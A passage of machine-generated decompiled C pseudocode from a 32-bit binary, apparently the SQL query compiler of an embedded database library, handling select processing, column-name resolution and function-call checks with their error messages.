  int v20; // ebx
  unsigned __int16 *v21; // eax
  int *v22; // edx
  _DWORD *v23; // edi
  int v24; // eax
  _WORD *v25; // ecx
  int v26; // eax
  _WORD *v27; // ecx
  int *v28; // edi
  int v29; // ebx
  int v30; // esi
  int v31; // eax
  int v32; // eax
  int v33; // eax
  int *v34; // eax
  int v35; // edi
  int v36; // edx
  int v37; // eax
  int *v38; // ecx
  int v39; // esi
  int v40; // edi
  int v41; // eax
  int v42; // edi
  int v43; // eax
  bool v44; // cc
  int *v45; // esi
  int v46; // esi
  int v47; // ebx
  int v48; // eax
  int *v49; // edi
  int v50; // eax
  int v51; // esi
  _DWORD *v52; // eax
  _DWORD *v53; // ecx
  unsigned __int16 *v54; // edi
  int v55; // esi
  int *v56; // eax
  _DWORD *v57; // edi
  int *v58; // [esp-4h] [ebp-DCh]
  int *v59; // [esp+Ch] [ebp-CCh]
  int Src; // [esp+10h] [ebp-C8h] BYREF
  unsigned __int8 v61; // [esp+17h] [ebp-C1h]
  int i; // [esp+18h] [ebp-C0h]
  int *v63; // [esp+1Ch] [ebp-BCh] BYREF
  int v64; // [esp+20h] [ebp-B8h]
  int v65; // [esp+24h] [ebp-B4h]
  int v66; // [esp+28h] [ebp-B0h]
  int v67; // [esp+2Ch] [ebp-ACh]
  int v68; // [esp+30h] [ebp-A8h]
  int *v69; // [esp+34h] [ebp-A4h] BYREF
  int v70; // [esp+38h] [ebp-A0h]
  int *v71; // [esp+3Ch] [ebp-9Ch]
  int v72; // [esp+40h] [ebp-98h]
  int v73; // [esp+44h] [ebp-94h]
  __int16 *v74; // [esp+48h] [ebp-90h]
  int v75; // [esp+4Ch] [ebp-8Ch]
  int *v76; // [esp+50h] [ebp-88h]
  _DWORD *v77; // [esp+54h] [ebp-84h]
  unsigned __int16 *v78; // [esp+58h] [ebp-80h]
  unsigned __int8 *v79; // [esp+5Ch] [ebp-7Ch]
  int v80; // [esp+60h] [ebp-78h]
  int v81[11]; // [esp+64h] [ebp-74h] BYREF
  _DWORD *v82; // [esp+90h] [ebp-48h]
  int v83; // [esp+94h] [ebp-44h]
  int v84; // [esp+98h] [ebp-40h]
  int v85; // [esp+9Ch] [ebp-3Ch]
  int v86; // [esp+A0h] [ebp-38h]
  char v87[4]; // [esp+A4h] [ebp-34h] BYREF
  int v88; // [esp+A8h] [ebp-30h]
  int v89; // [esp+ACh] [ebp-2Ch]
  int v90; // [esp+B0h] [ebp-28h]
  int v91[9]; // [esp+B4h] [ebp-24h] BYREF

  v3 = (int *)a1;
  v4 = (int)a2;
  v5 = *(_DWORD *)a1;
  result = 1;
  v64 = 1;
  v67 = v5;
  if ( !a2 || *(_BYTE *)(v5 + 30) || *(_DWORD *)(a1 + 64) )
    return result;
  memset(v81, 0, sizeof(v81));
  if ( *a3 <= 4u )
  {
    sub_100767B1(a2[6], v5);
    a2[6] = 0;
    *((_WORD *)a2 + 3) &= ~1u;
  }
  sub_1007E178((int *)a1, (int)a2, 0);
  v69 = a2[6];
  v7 = *(_DWORD *)(a1 + 64) == 0;
  v74 = (__int16 *)a2[2];
  if ( !v7 )
    goto LABEL_123;
  if ( *(_BYTE *)(v67 + 30) )
    goto LABEL_123;
  v70 = (*((unsigned __int8 *)a2 + 6) >> 2) & 1;
  v59 = sub_1007C271((int *)a1);
  if ( !v59 )
    goto LABEL_123;
  for ( i = 0; !a2[7] && i < *v74; ++i )
  {
    v8 = &v74[28 * i + 4];
    v66 = *(_DWORD *)&v74[28 * i + 12];
    if ( v66 && !LOBYTE(v74[28 * i + 14]) )
    {
      Src = 0;
      sub_10075B99(&Src, (int)a2);
      v3[133] += Src;
      Src = (*(unsigned __int8 *)(v66 + 6) >> 2) & 1;
      if ( sub_1007D656((int)a2, v3, i, v70, Src) )
      {
        if ( Src )
        {
          *((_WORD *)a2 + 3) |= 4u;
          v70 = 1;
        }
        i = -1;
      }
      else
      {
        v9 = *((_DWORD *)v8 + 6);
        v89 = 0;
        v90 = 0;
        v88 = v9;
        strcpy(v87, "\t");
        sub_1007E480(v3, v66, v87);
        *((_BYTE *)v8 + 20) = 1;
      }
      if ( *(_BYTE *)(v67 + 30) )
        goto LABEL_123;
      Src = 0;
      sub_10075B99(&Src, (int)a2);
      v3 = (int *)a1;
      *(_DWORD *)(a1 + 532) -= Src;
      v74 = (__int16 *)a2[2];
      if ( *a3 > 4u )
        v69 = a2[6];
    }
  }
  v10 = *a2;
  v73 = (int)a2[3];
  v63 = a2[4];
  v79 = (unsigned __int8 *)a2[5];
  v11 = (int *)(*((_BYTE *)a2 + 6) & 1);
  v7 = a2[7] == 0;
  v76 = v10;
  Src = (int)v11;
  if ( v7 )
  {
    if ( *v10 <= 1 )
      v16 = 0;
    else
      v16 = sub_1007B5D0(*a3, v3, *a3);
    if ( v16 )
      goto LABEL_123;
    if ( (*((_BYTE *)a2 + 6) & 5) == 1 )
    {
      v17 = (int *)sub_10076339(*a2, v67, 0);
      *((_WORD *)a2 + 3) &= ~1u;
      Src = 0;
      a2[4] = v17;
      v63 = v17;
    }
    v18 = v69;
    if ( v69 )
    {
      v19 = (unsigned __int16 *)sub_1007B93D((int *)a1, v69);
      v18[2] = (*(_DWORD *)(a1 + 68))++;
      v68 = sub_1005AC02(v59, 40, v18[2], *v18 + 2, 0, v19, (_BYTE *)0xFFFFFFF0);
      a2[16] = (_DWORD *)v68;
    }
    else
    {
      v68 = -1;
    }
    if ( *a3 == 9 )
      sub_1005ABE8((int)v59, 40, *((_DWORD *)a3 + 1), *v76);
    v86 = sub_1005AC63((int)v59);
    sub_1007C285(a2, (int *)a1, v86);
    if ( Src )
    {
      v20 = *(_DWORD *)(a1 + 68);
      *(_DWORD *)(a1 + 68) = v20 + 1;
      v58 = *a2;
      v84 = v20;
      v21 = (unsigned __int16 *)sub_1007B93D((int *)a1, v58);
      sub_1005AC02(v59, 40, v20, 0, 0, v21, (_BYTE *)0xFFFFFFF0);
    }
    else
    {
      v84 = -1;
    }
    v22 = v63;
    if ( v70 )
    {
      if ( !v63 )
        goto LABEL_59;
    }
    else if ( !v63 )
    {
      v23 = sub_10087D63((int *)a1, v74, (unsigned __int8 *)v73, &v69, 0);
      if ( v23 )
      {
        if ( v68 >= 0 && !v69 )
        {
          sub_1005AF65(v59, v68, 1);
          a2[16] = (_DWORD *)-1;
        }
        sub_1007B5F5(a3, (int *)a1, (int)a2, (int)v76, 0, 0, v69, -1, v23[4], v23[5]);
        sub_100883D6((unsigned int)v23);
        goto LABEL_119;
      }
LABEL_123:
      sub_10058EC7(v67, v81[4]);
      sub_10058EC7(v67, v81[8]);
      return v64;
    }
    v24 = **a2;
    if ( v24 > 0 )
    {
      v25 = (_WORD *)((*a2)[3] + 16);
      do
      {
        *v25 = 0;
        --v24;
        v25 += 10;
      }
      while ( v24 > 0 );
    }
    v26 = *v22;
    if ( *v22 > 0 )
    {
      v27 = (_WORD *)(v22[3] + 16);
      do
      {
        *v27 = 0;
        --v26;
        v27 += 10;
      }
      while ( v26 > 0 );
    }
LABEL_59:
    v72 = sub_1005AC63((int)v59);
    memset(v91, 0, sizeof(v91));
    v91[1] = (int)v74;
    v91[7] = (int)v81;
    v91[0] = a1;
    if ( v63 )
      v81[3] = *v63 + 1;
    else
      v81[3] = 0;
    v28 = v63;
    v81[2] = (int)v63;
    sub_10078A2C(v76, (int (__cdecl *)(_DWORD, int))v91);
    sub_10078A2C(v69, (int (__cdecl *)(_DWORD, int))v91);
    v29 = 0;
    if ( v79 )
      sub_10078A05((int (__cdecl *)(_DWORD, int))v91, (int)v79);
    v81[7] = v81[5];
    for ( i = 0; i < v81[9]; v29 += 16 )
    {
      sub_10078A2C(*(int **)(*(_DWORD *)(v29 + v81[8]) + 16), (int (__cdecl *)(_DWORD, int))v91);
      ++i;
    }
    if ( *(_BYTE *)(v67 + 30) )
      goto LABEL_123;
    if ( v28 )
    {
      v81[1] = *(_DWORD *)(a1 + 68);
      *(_DWORD *)(a1 + 68) = v81[1] + 1;
      v78 = (unsigned __int16 *)sub_1007B93D((int *)a1, v28);
      v77 = (_DWORD *)sub_1005AC02(v59, 40, v81[1], v81[3], 0, v78, (_BYTE *)0xFFFFFFF0);
      v30 = *(_DWORD *)(a1 + 72) + 2;
      v71 = (int *)(*(_DWORD *)(a1 + 72) + 1);
      v68 = (int)v71 + 2;
      *(_DWORD *)(a1 + 72) = (char *)v71 + 2;
      v83 = v30;
      v31 = sub_1005AC63((int)v59);
      ++*(_DWORD *)(a1 + 72);
      v80 = v31;
      Src = *(_DWORD *)(a1 + 72);
      v66 = sub_1005AC63((int)v59);
      v32 = *(_DWORD *)(a1 + 72);
      v85 = v32 + 1;
      v33 = *v28 + v32;
      *(_DWORD *)(a1 + 72) = v33;
      v70 = v33 + 1;
      *(_DWORD *)(a1 + 72) = v33 + *v28;
      sub_1005ABE8((int)v59, 7, 0, v30);
      sub_1005ABE8((int)v59, 7, 0, (int)v71);
      sub_1005ABE8((int)v59, 2, Src, v66);
      v82 = sub_10087D63((int *)a1, v74, (unsigned __int8 *)v73, &v63, 0);
      if ( !v82 )
        goto LABEL_123;
      if ( v63 )
      {
        v35 = *v63;
        v36 = v81[5];
        v37 = *v63 + 1;
        v73 = 1;
        v64 = v37;
        v65 = v37;
        if ( v81[5] > 0 )
        {
          v38 = (int *)(v81[4] + 12);
          do
          {
            if ( *v38 >= v37 )
            {
              ++v65;
              ++v37;
            }
            v38 += 6;
            --v36;
          }
          while ( v36 );
        }
        v39 = sub_10078AA4((_DWORD *)a1, v65);
        sub_100773BA(a1);
        sub_10078052(v63, a1, v39, 0);
        sub_1005ABE8((int)v59, 52, v81[1], v39 + v35);
        i = 0;
        v40 = v64;
        if ( v81[5] > 0 )
        {
          v64 = 0;
          v75 = v39 + v40;
          do
          {
            if ( *(_DWORD *)(v64 + v81[4] + 12) >= v40 )
            {
              v41 = sub_100772FA(
                      (_DWORD *)a1,
                      *(_DWORD *)(v64 + v81[4]),
                      *(_DWORD *)(v64 + v81[4] + 8),
                      *(_DWORD *)(v64 + v81[4] + 4),
                      v75);
              if ( v75 != v41 )
                sub_1005ABE8((int)v59, 15, v41, v75);
              ++v40;
              ++v75;
            }
            ++i;
            v64 += 24;
          }
          while ( i < v81[5] );
        }
        v42 = sub_10078A55(a1);
        sub_1005AB66((int)v59, 30, v39, v65, v42);
        sub_1005ABE8((int)v59, 67, v81[1], v42);
        v43 = sub_10078A70(a1, v42);
        sub_10078AC8(v43, v39, v65);
        sub_100883D6((unsigned int)v82);
        sub_1005ABE8((int)v59, 63, v81[1], v72);
        BYTE1(v81[0]) = 1;
        sub_100773BA(a1);
      }
      else
      {
        v34 = a2[4];
        v73 = 0;
        v63 = v34;
      }
      v75 = v59[3];
      sub_100773BA(a1);
      v44 = *v63 <= 0;
      v65 = 0;
      if ( !v44 )
      {
        v64 = 0;
        do
        {
          if ( v73 )
          {
            sub_1005AB66((int)v59, 28, v81[1], v65, v65 + v70);
          }
          else
          {
            LOBYTE(v81[0]) = 1;
            sub_10077F49((int *)a1, v65 + v70, *(unsigned __int8 **)(v63[3] + v64));
          }
          ++v65;
          v64 += 20;
        }
        while ( v65 < *v63 );
      }
      v45 = v63;
      sub_1005AC02(v59, 24, v85, v70, *v63, v78, (_BYTE *)0xFFFFFFFA);
      v78 = (unsigned __int16 *)v59[3];
      sub_1005AB66((int)v59, 25, (int)v78 + 1, 0, (int)v78 + 1);
      sub_100773D8(a1, *v45, v70, v85);
      v46 = (int)v59;
      sub_1005ABE8((int)v59, 2, v68, v80);
      sub_1005ABE8((int)v59, 112, v83, v72);
      sub_1005ABE8((int)v59, 2, Src, v66);
      sub_1005AE20((int)v78, (int)v59);
      sub_1007E306((int *)a1, (int)v81);
      sub_1005ABE8((int)v59, 7, 1, (int)v71);
      if ( v73 )
      {
        sub_1005ABE8((int)v59, 66, v81[1], v75);
      }
      else
      {
        sub_100883D6((unsigned int)v82);
        sub_1005AF65(v59, (int)v77, 1);
      }
      sub_1005ABE8((int)v59, 2, v68, v80);
      sub_1005ABE8((int)v59, 1, 0, v72);
      v77 = (_DWORD *)v59[3];
      sub_1005ABE8((int)v59, 7, 1, v83);
      sub_1005ABD1((int)v59, 3, v68);
      sub_1005ACAF((int)v59, v80);
      v47 = v59[3];
      sub_1005ABE8((int)v59, 112, (int)v71, v47 + 2);
      sub_1005ABD1((int)v59, 3, v68);
      sub_1007E2BB(a1, (int)v81);
      sub_100783F1((int *)a1, v79, ++v47, 8);
      sub_1007B5F5(a3, (int *)a1, (int)a2, (int)*a2, 0, 0, v69, v84, v47, (int)v77);
      sub_1005ABD1((int)v59, 3, v68);
      sub_1005ACAF((int)v59, v66);
      sub_1007E1FD(v81, (int *)a1);
      sub_1005ABD1((int)v59, 3, Src);
    }
    else
    {
      v71 = 0;
      v48 = sub_1007DB62(a2, (int)v81);
      v49 = (int *)v48;
      if ( v48 )
      {
        v50 = sub_1005855F(*(_DWORD *)a1, *(_DWORD *)(v48 + 68));
        Src = 0;
        v77 = 0;
        v51 = v50;
        v66 = *(_DWORD *)(a1 + 68);
        *(_DWORD *)(a1 + 68) = v66 + 1;
        v78 = (unsigned __int16 *)v49[6];
        sub_1006CAC0((int *)a1, v50);
        sub_10069AEC(a1, v49[6], v51, 0, v49[1]);
        v52 = (_DWORD *)v49[5];
        if ( !v52 )
          goto LABEL_103;
        v53 = v77;
        do
        {
          if ( !v53 || v52[1] < v53[1] )
            v53 = v52;
          v52 = (_DWORD *)v52[8];
        }
        while ( v52 );
        if ( v53[1] < v49[3] )
        {
          v54 = (unsigned __int16 *)v53[5];
          Src = sub_1006CBB6((int *)a1, v53);
        }
        else
        {
LABEL_103:
          v54 = v78;
        }
        sub_1005AB66((int)v59, 38, v66, (int)v54, v51);
        if ( Src )
          sub_1005AFA8(-1, v59, (unsigned __int16 *)Src, (_BYTE *)0xFFFFFFF0);
        sub_1005ABE8((int)v59, 31, v66, *(_DWORD *)(v81[8] + 8));
        sub_1005ABD1((int)v59, 42, v66);
      }
      else
      {
        Src = 0;
        v61 = sub_1007DAFF((int *)a2);
        if ( v61 )
        {
          v55 = v67;
          v56 = (int *)sub_10076339(*(int **)(*(_DWORD *)(*a2)[3] + 16), v67, 0);
          Src = (int)v56;
          v71 = v56;
          if ( v56 )
          {
            if ( !*(_BYTE *)(v55 + 30) )
            {
              *(_BYTE *)(v56[3] + 12) = v61 != 1;
              **(_BYTE **)v56[3] = -104;
            }
          }
        }
        sub_1007E1FD(v81, (int *)a1);
        v57 = sub_10087D63((int *)a1, v74, (unsigned __int8 *)v73, (int **)&Src, v61);
        if ( !v57 )
        {
          sub_100767B1(v71, v67);
          goto LABEL_123;
        }
        sub_1007E306((int *)a1, (int)v81);
        if ( !Src && v61 )
          sub_1005ABE8((int)v59, 1, 0, v57[5]);
        sub_100883D6((unsigned int)v57);
        sub_1007E2BB(a1, (int)v81);
      }
      v69 = 0;
      sub_100783F1((int *)a1, v79, v72, 8);
      sub_1007B5F5(a3, (int *)a1, (int)a2, (int)*a2, 0, 0, 0, -1, v72, v72);
      sub_100767B1(v71, v67);
      v46 = (int)v59;
    }
    sub_1005ACAF(v46, v72);
    v4 = (int)a2;
LABEL_119:
    if ( v69 )
      sub_1007B9D6(a1, v4, v59, *v76, a3);
    sub_1005ACAF((int)v59, v86);
    v7 = *a3 == 5;
    v64 = 0;
    if ( v7 )
      sub_1007BDF4(a1, v74, v76);
    goto LABEL_123;
  }
  if ( a2[9] )
    return sub_1007C3F7(a2, v3, (int)a3);
  v12 = 0;
  v13 = 0;
  v14 = a2;
  do
  {
    v14[8] = v12;
    v14[9] = a2;
    v12 = v14;
    v14 = (_DWORD *)v14[7];
    ++v13;
  }
  while ( v14 );
  v15 = *(_DWORD *)(v67 + 88);
  if ( !v15 || v13 <= v15 )
    return sub_1007C3F7(a2, v3, (int)a3);
  sub_10059320(v3, aTooManyTermsIn);
  return 1;
}
// 1007EEF7: conditional instruction was optimized away because ecx.4!=0
// 1007E480: using guessed type int *Src;

//----- (1007F120) --------------------------------------------------------
void __usercall sub_1007F120(int a1@<eax>, _BYTE *a2@<ecx>, int *a3, int a4, _DWORD *a5)
{
  int v5; // ebx
  int v6; // edi
  int v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // esi
  _BYTE *v10; // ebx
  _DWORD *v11; // eax
  int v12; // eax
  int v13; // [esp+10h] [ebp-4h]

  v5 = 20 * a1;
  v6 = *(_DWORD *)(20 * a1 + *(_DWORD *)(a4 + 12));
  v7 = *a3;
  v13 = *a3;
  if ( *(_BYTE *)v6 == 0x98 || *a2 == 71 )
  {
    if ( (*(_WORD *)(v6 + 2) & 0x400) != 0 || (v10 = *(_BYTE **)(v6 + 4)) == 0 )
    {
      v9 = sub_1007631C(v7, (void **)v6, 0);
      if ( !v9 )
        return;
    }
    else
    {
      *(_DWORD *)(v6 + 4) = 0;
      v11 = sub_1007631C(v7, (void **)v6, 0);
      v9 = v11;
      *(_DWORD *)(v6 + 4) = v10;
      if ( !v11 )
        return;
      *((_BYTE *)v11 + 34) |= 1u;
      v11[1] = sub_10059194(v10);
    }
  }
  else
  {
    v8 = sub_1007631C(v7, (void **)v6, 0);
    v9 = sub_10075DC6(0, 0, a3, 24, (unsigned int)v8);
    if ( !v9 )
      return;
    if ( !*(_WORD *)(v5 + *(_DWORD *)(a4 + 12) + 16) )
    {
      ++a3[116];
      *(_WORD *)(v5 + *(_DWORD *)(a4 + 12) + 16) = *((_WORD *)a3 + 232);
    }
    v9[6] = *(unsigned __int16 *)(v5 + *(_DWORD *)(a4 + 12) + 16);
  }
  if ( (*((_WORD *)a5 + 1) & 0x100) != 0 )
  {
    v12 = a5[5];
    *((_WORD *)v9 + 1) |= 0x100u;
    v9[5] = v12;
  }
  *((_WORD *)a5 + 1) |= 0x4000u;
  sub_10075FD8(v13, (unsigned int)a5);
  memcpy(a5, v9, 0x30u);
  sub_10058EC7(v13, (unsigned int)v9);
}

//----- (1007F22A) --------------------------------------------------------
int __usercall sub_1007F22A@<eax>(
        int a1@<ebx>,
        int a2,
        unsigned __int8 *a3,
        unsigned __int8 *a4,
        unsigned __int8 *a5,
        int a6)
{
  int v6; // edx
  __int16 *v7; // eax
  __int16 *v8; // esi
  _DWORD *v9; // edi
  unsigned __int8 *v10; // ecx
  int v11; // eax
  unsigned __int8 *v12; // ecx
  int v13; // eax
  __int16 v15; // ax
  int v16; // eax
  unsigned __int8 **v17; // edi
  int v18; // edi
  _DWORD *v19; // edi
  int v20; // esi
  int v21; // eax
  int v22; // eax
  int *v23; // edi
  unsigned __int8 **v24; // esi
  const char *v26; // eax
  __int16 v27; // ax
  char v28; // cl
  int i; // eax
  unsigned int v30; // [esp-Ch] [ebp-40h]
  int v31; // [esp+Ch] [ebp-28h]
  int v32; // [esp+10h] [ebp-24h]
  __int16 *v33; // [esp+14h] [ebp-20h]
  __int16 *v34; // [esp+18h] [ebp-1Ch]
  unsigned __int8 **v35; // [esp+18h] [ebp-1Ch]
  unsigned __int8 *v36; // [esp+18h] [ebp-1Ch]
  __int16 *v37; // [esp+1Ch] [ebp-18h]
  unsigned __int8 **v38; // [esp+1Ch] [ebp-18h]
  int v39; // [esp+1Ch] [ebp-18h]
  int v40; // [esp+20h] [ebp-14h]
  int v41; // [esp+24h] [ebp-10h]
  int v42; // [esp+28h] [ebp-Ch]
  int v43; // [esp+2Ch] [ebp-8h]
  int v44; // [esp+2Ch] [ebp-8h]
  int v45; // [esp+2Ch] [ebp-8h]
  int v46; // [esp+30h] [ebp-4h]

  v6 = *(_DWORD *)a2;
  *(_DWORD *)(a1 + 24) = -1;
  v46 = 0;
  v41 = 0;
  v40 = v6;
  v33 = 0;
  v31 = a6;
  v32 = 0;
  *(_DWORD *)(a1 + 40) = 0;
  if ( !a6 )
  {
LABEL_79:
    if ( a4 || (*(_BYTE *)(a1 + 2) & 0x40) == 0 )
    {
      v26 = aNoSuchColumn;
      goto LABEL_91;
    }
    *(_DWORD *)(a1 + 40) = 0;
    *(_BYTE *)a1 = 94;
    return 1;
  }
  while ( !v46 )
  {
    v7 = *(__int16 **)(a6 + 4);
    v34 = v7;
    if ( v7 )
    {
      v42 = 0;
      v8 = v7 + 4;
      v37 = v7 + 4;
      if ( *v7 > 0 )
      {
        do
        {
          v9 = (_DWORD *)*((_DWORD *)v8 + 3);
          if ( a4 )
          {
            v10 = (unsigned __int8 *)*((_DWORD *)v8 + 2);
            if ( v10 )
            {
              v11 = sub_100593BE(v10, a4);
              goto LABEL_12;
            }
            v12 = (unsigned __int8 *)v9[1];
            if ( !v12 || sub_100593BE(v12, a4) )
              goto LABEL_30;
            if ( a3 )
            {
              v13 = sub_1005855F(v40, v9[17]);
              v11 = sub_100593BE(*(unsigned __int8 **)(16 * v13 + *(_DWORD *)(v40 + 8)), a3);
              v8 = v37;
LABEL_12:
              if ( v11 )
                goto LABEL_30;
            }
          }
          if ( !v41++ )
          {
            *(_DWORD *)(a1 + 24) = *((_DWORD *)v8 + 6);
            *(_DWORD *)(a1 + 40) = v9;
            v33 = v8;
          }
          v43 = 0;
          v38 = (unsigned __int8 **)v9[4];
          if ( (int)v9[3] <= 0 )
            goto LABEL_30;
          while ( sub_100593BE(*v38, a5) )
          {
            ++v43;
            v38 += 6;
            if ( v43 >= v9[3] )
              goto LABEL_30;
          }
          ++v46;
          *(_DWORD *)(a1 + 24) = *((_DWORD *)v8 + 6);
          v15 = v43;
          *(_DWORD *)(a1 + 40) = v9;
          v33 = v8;
          if ( v43 == v9[2] )
            v15 = -1;
          *(_WORD *)(a1 + 28) = v15;
          if ( v42 >= *v34 - 1 )
            goto LABEL_30;
          if ( (*((_BYTE *)v8 + 77) & 4) == 0 )
          {
            v16 = *((_DWORD *)v8 + 22);
            if ( !v16 )
              goto LABEL_30;
            v39 = 0;
            v44 = *(_DWORD *)(v16 + 4);
            if ( v44 <= 0 )
              goto LABEL_30;
            v17 = *(unsigned __int8 ***)v16;
            while ( sub_100593BE(*v17, a5) )
            {
              ++v39;
              v17 += 2;
              if ( v39 >= v44 )
                goto LABEL_30;
            }
          }
          v8 += 28;
          ++v42;
LABEL_30:
          ++v42;
          v8 += 28;
          v37 = v8;
        }
        while ( v42 < *v34 );
      }
    }
    if ( !a3 && a4 )
    {
      if ( v46 )
        goto LABEL_77;
      if ( !*(_DWORD *)(a2 + 428) )
        goto LABEL_66;
      v18 = *(unsigned __int8 *)(a2 + 440);
      if ( v18 == 106 || sub_100593BE((unsigned __int8 *)aNew, a4) )
      {
        if ( v18 == 105 || sub_100593BE((unsigned __int8 *)aOld, a4) )
          goto LABEL_66;
        *(_DWORD *)(a1 + 24) = 0;
      }
      else
      {
        *(_DWORD *)(a1 + 24) = 1;
      }
      v19 = *(_DWORD **)(a2 + 428);
      if ( !v19 )
        goto LABEL_66;
      ++v41;
      v20 = 0;
      if ( (int)v19[3] <= 0 )
        goto LABEL_52;
      v35 = (unsigned __int8 **)v19[4];
      while ( sub_100593BE(*v35, a5) )
      {
        v35 += 6;
        if ( ++v20 >= v19[3] )
          goto LABEL_49;
      }
      if ( v20 == v19[2] )
        v20 = -1;
LABEL_49:
      if ( v20 >= v19[3] )
      {
LABEL_52:
        if ( sub_10076961(a5) )
          v20 = -1;
        if ( v20 >= v19[3] )
        {
LABEL_66:
          if ( v41 == 1 && sub_10076961(a5) )
          {
            *(_WORD *)(a1 + 28) = -1;
            v46 = 1;
            *(_BYTE *)(a1 + 1) = 100;
          }
          else
          {
            v23 = *(int **)(a6 + 8);
            if ( v23 )
            {
              if ( !a4 )
              {
                v45 = 0;
                if ( *v23 > 0 )
                {
                  v24 = (unsigned __int8 **)(v23[3] + 4);
                  while ( 1 )
                  {
                    v36 = *v24;
                    if ( *v24 )
                    {
                      if ( !sub_100593BE(*v24, a5) )
                        break;
                    }
                    ++v45;
                    v24 += 5;
                    if ( v45 >= *v23 )
                      goto LABEL_76;
                  }
                  if ( !*(_BYTE *)(a6 + 20) && (*(_BYTE *)(*(_DWORD *)(v23[3] + 20 * v45) + 2) & 2) != 0 )
                  {
                    sub_10059320((int *)a2, "misuse of aliased aggregate %s", (const char *)v36);
                    return 2;
                  }
                  sub_1007F120(v45, &unk_10186494, (int *)a2, (int)v23, (_DWORD *)a1);
                  goto LABEL_103;
                }
              }
            }
LABEL_76:
            a6 = *(_DWORD *)(a6 + 32);
          }
          goto LABEL_77;
        }
      }
      v46 = 1;
      if ( v20 >= 0 )
      {
        if ( *(_DWORD *)(a1 + 24) )
        {
          if ( v20 < 32 )
            v22 = 1 << v20;
          else
            v22 = -1;
          *(_DWORD *)(a2 + 436) |= v22;
        }
        else
        {
          if ( v20 < 32 )
            v21 = 1 << v20;
          else
            v21 = -1;
          *(_DWORD *)(a2 + 432) |= v21;
        }
      }
      else
      {
        *(_BYTE *)(a1 + 1) = 100;
      }
      *(_WORD *)(a1 + 28) = v20;
      *(_DWORD *)(a1 + 40) = v19;
      v32 = 1;
    }
    if ( !v46 )
      goto LABEL_66;
LABEL_77:
    if ( !a6 )
    {
      if ( !v46 )
        goto LABEL_79;
      break;
    }
  }
  if ( v46 == 1 )
    goto LABEL_97;
  v26 = aAmbiguousColum;
LABEL_91:
  if ( a3 )
  {
    sub_10059320((int *)a2, "%s: %s.%s.%s", v26, (const char *)a3, (const char *)a4, (const char *)a5);
  }
  else if ( a4 )
  {
    sub_10059320((int *)a2, "%s: %s.%s", v26, (const char *)a4, (const char *)a5);
  }
  else
  {
    sub_10059320((int *)a2, "%s: %s", v26, (const char *)a5);
  }
  ++*(_DWORD *)(v31 + 16);
LABEL_97:
  v27 = *(_WORD *)(a1 + 28);
  if ( v27 >= 0 && v33 )
  {
    v28 = *(_WORD *)(a1 + 28);
    if ( v27 >= 64 )
      v28 = 63;
    *((_QWORD *)v33 + 5) |= 1i64 << v28;
  }
  sub_10075FD8(v40, *(_DWORD *)(a1 + 8));
  v30 = *(_DWORD *)(a1 + 12);
  *(_DWORD *)(a1 + 8) = 0;
  sub_10075FD8(v40, v30);
  *(_DWORD *)(a1 + 12) = 0;
  *(_BYTE *)a1 = v32 == 0 ? -104 : 60;
  if ( v46 == 1 )
  {
LABEL_103:
    for ( i = v31; ; i = *(_DWORD *)(i + 32) )
    {
      ++*(_DWORD *)(i + 12);
      if ( i == a6 )
        break;
    }
    return 1;
  }
  return 2;
}
// 1007F556: conditional instruction was optimized away because %var_4.4==0
// 1007F5E1: conditional instruction was optimized away because %var_4.4>=2u

//----- (1007F6B7) --------------------------------------------------------
_DWORD *__usercall sub_1007F6B7@<eax>(int a1@<eax>, int a2@<ebx>, int a3, int a4)
{
  _DWORD *result; // eax
  int v6; // edi
  char v7; // cl

  result = sub_10075C72(0, a3, 152, 0);
  if ( result )
  {
    v6 = 56 * a1 + a4 + 8;
    result[10] = *(_DWORD *)(v6 + 12);
    result[6] = *(_DWORD *)(v6 + 24);
    if ( *(_DWORD *)(result[10] + 8) == a2 )
    {
      *((_WORD *)result + 14) = -1;
    }
    else
    {
      *((_WORD *)result + 14) = a2;
      if ( a2 < 64 )
        v7 = a2;
      else
        v7 = 63;
      *(_QWORD *)(v6 + 40) |= 1i64 << v7;
    }
    *((_WORD *)result + 1) |= 4u;
  }
  return result;
}

//----- (1007F728) --------------------------------------------------------
int __cdecl sub_1007F728(int a1, unsigned __int8 *a2)
{
  int v2; // ebx
  int *v4; // edi
  int result; // eax
  int v6; // eax
  __int16 v7; // cx
  int v8; // eax
  int v9; // ecx
  unsigned __int8 *v10; // edx
  int v11; // eax
  int v12; // eax
  int *v13; // eax
  char v14; // al
  unsigned __int8 *v15; // edi
  int v16; // edx
  _DWORD *v17; // eax
  int *v18; // [esp+Ch] [ebp-14h]
  char v19; // [esp+10h] [ebp-10h]
  int v20; // [esp+14h] [ebp-Ch]
  _BYTE *Size; // [esp+18h] [ebp-8h]
  int *v22; // [esp+1Ch] [ebp-4h]
  int v23; // [esp+2Ch] [ebp+Ch]
  BOOL v24; // [esp+2Ch] [ebp+Ch]

  v2 = *(_DWORD *)(a1 + 12);
  v4 = *(int **)v2;
  v22 = *(int **)v2;
  if ( (*((_WORD *)a2 + 1) & 4) != 0 )
    return 1;
  v6 = *a2;
  v7 = *((_WORD *)a2 + 1) | 4;
  *((_WORD *)a2 + 1) = v7;
  if ( v6 > 118 )
  {
    v11 = v6 - 133;
    if ( v11 )
    {
      v12 = v11 - 18;
      if ( !v12 || v12 == 4 )
      {
        v13 = (int *)*((_DWORD *)a2 + 4);
        v18 = v13;
        if ( v13 )
          v20 = *v13;
        else
          v20 = 0;
        v14 = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*v4 + 8) + 12) + 73);
        v15 = (unsigned __int8 *)*((_DWORD *)a2 + 1);
        v24 = 0;
        v19 = v14;
        Size = sub_10059297(*((_BYTE **)a2 + 1));
        v17 = sub_100697AC((size_t)Size, v20, v16, v15, v19, 0);
        if ( v17 )
        {
          v24 = v17[3] == 0;
          if ( !v17[3] )
          {
            if ( *(_BYTE *)(v2 + 20) )
            {
LABEL_29:
              if ( v24 )
              {
                *a2 = -103;
                *(_BYTE *)(v2 + 21) = 1;
                *(_BYTE *)(v2 + 20) = 0;
              }
              goto LABEL_31;
            }
            sub_10059320(v22, "misuse of aggregate function %.*s()", (int)Size, (const char *)v15);
            ++*(_DWORD *)(v2 + 16);
            v24 = 0;
          }
        }
        else
        {
          if ( sub_100697AC((size_t)Size, -1, *v22, v15, v19, 0) )
          {
            sub_10059320(v22, "wrong number of arguments to function %.*s()", (int)Size, (const char *)v15);
            ++*(_DWORD *)(v2 + 16);
            goto LABEL_29;
          }
          sub_10059320(v22, "no such function: %.*s", (int)Size, (const char *)v15);
          ++*(_DWORD *)(v2 + 16);
        }
